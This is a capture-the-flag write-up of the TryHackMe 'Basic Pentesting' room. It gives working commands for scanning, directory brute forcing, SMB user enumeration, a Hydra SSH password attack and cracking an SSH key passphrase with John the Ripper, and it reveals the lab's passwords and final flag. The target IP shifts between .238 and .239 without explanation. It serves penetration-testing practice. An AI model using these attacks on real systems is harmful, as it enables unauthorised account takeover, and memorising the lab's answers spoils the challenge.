**Room:** [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

---

##  Prompt

> In these set of tasks you'll learn the following:
>brute forcing 
>hash cracking 
>service enumeration
>Linux Enumeration
>The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file.

>Credits to Josiah Pierce from Vulnhub.

---
## Walkthrough

We are started with the IP: 10.201.98.238

Used: 
```bash
nmap -sC -sV 10.201.98.238
```
Then I have found these open ports:
```text
22   → ssh        → OpenSSH
80   → http       → Apache
139  → netbios-ssn → Samba
445  → netbios-ssn → Samba
8009 → ajp13      → Apache JServ
8080 → http       → Apache Tomcat
```
---
On 10.201.98.239, I found the following comment in the page source:
```php-template
<!-- Check our dev note section if you need to know what to work on. -->
```
Which, made me look through 10.201.98.239/dev.
Then I have found
```text
Apache/2.4.41 (Ubuntu) Server at 10.201.98.239 Port 80
```
While, I still didn't have any information, I used gobuster if there any open domain:
```bash
gobuster dir --url http://10.201.98.239/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Results: /development and /server-status.

From /development, I found an “Index of /development” page with two files: dev.txt and j.txt.

--> dev.txt contained:
```vbnet
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

--> j.txt contained:
```vbnet 
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
---
Since we didn't yet have valid credentials, I used enum4linux for reconnaissance:
```bash
python3 enum4linux-ng.py -A 10.201.98.238
```
From the output, I identified two usernames: kay and jan
---
Knowing the usernames, I tried brute-forcing SSH with Hydra:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.201.98.239
```
Result: The password for jan was armondo.
---
After logging in as jan, I noticed his account was linked to kay.
Exploring kay’s account didn’t show much at first, so I ran LinPeas, which highlighted a hidden directory.
```swift
/home/kay/.ssh/
```
Inside, I found:
--->authorized_keys
--->id_rsa
--->id_rsa.pub
The id_rsa file contained an encrypted SSH private key.
---
To crack it, I first converted it for John the Ripper using ssh2john.py:
```bash
/opt/john/ssh2john.py kay_rsa > forjohn.txt
```
```bash
$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad...
```
Then ran the dictionary attack of John with the rockyou wordlist:
```bash
/opt/john/john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
John cracked the key and revealed the passphrase: beeswax.
---
Using the key and passphrase, I logged in as kay.
Inside, I found a file called pass.bak, which contained the final flag:
```text
heresareallystrongpasswordthatfollowsthepasswordpolicy
```
Then I have finished the room.















